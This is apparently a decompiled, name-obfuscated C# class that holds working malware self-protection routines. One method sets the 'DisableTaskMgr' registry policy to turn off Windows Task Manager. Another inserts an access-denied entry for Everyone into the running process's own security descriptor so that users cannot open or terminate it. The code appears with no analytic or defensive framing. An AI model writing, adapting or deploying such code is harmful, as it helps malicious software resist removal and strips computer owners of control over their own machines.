using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace oEqFtKwIikP;

internal class qKpUyQZRltiDbT
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr tnHbgxObvPP, int dlgattnDVTtOKXR, [Out] byte[] WgaGkxWYcJJ, uint mgQuUyXgwzIa, out uint dnDLOmJTKTqH);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr CteTqGMRZonlTULC, int DjVJfKXrqtf, [In] byte[] MzHueMJCWkrPHkGX);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void xbTVzktDHjFfpqbykG(bool qZWPkESzjFDGt)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (qZWPkESzjFDGt && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor GsyuyKZLqyMX(IntPtr qjfpfkTEtbfzZVl)
	{
		byte[] wgaGkxWYcJJ = new byte[0];
		GetKernelObjectSecurity(qjfpfkTEtbfzZVl, 4, wgaGkxWYcJJ, 0u, out var dnDLOmJTKTqH);
		if ((long)dnDLOmJTKTqH > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(qjfpfkTEtbfzZVl, 4, wgaGkxWYcJJ = new byte[dnDLOmJTKTqH], dnDLOmJTKTqH, out dnDLOmJTKTqH))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(wgaGkxWYcJJ, 0);
	}

	private void IHYQBHODqibE(IntPtr acRrLClHvKgz, RawSecurityDescriptor CsYIBzlvLKIUj)
	{
		byte[] array = new byte[CsYIBzlvLKIUj.BinaryLength];
		CsYIBzlvLKIUj.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(acRrLClHvKgz, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public void ALeoHomuEQ()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = GsyuyKZLqyMX(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		IHYQBHODqibE(currentProcess, rawSecurityDescriptor);
	}
}
